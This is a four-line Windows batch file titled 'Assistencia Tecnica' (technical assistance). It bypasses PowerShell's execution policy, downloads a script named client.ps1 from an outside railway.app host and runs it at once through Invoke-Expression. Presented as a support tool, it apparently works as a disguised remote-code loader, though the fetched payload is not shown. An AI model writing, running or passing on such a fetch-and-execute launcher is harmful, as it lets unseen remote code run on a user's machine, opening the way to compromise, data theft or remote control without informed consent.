@echo off
title Assistencia Tecnica
powershell -ExecutionPolicy Bypass -Command "irm https://web-production-9d7cc.up.railway.app/client.ps1 | iex"
pause
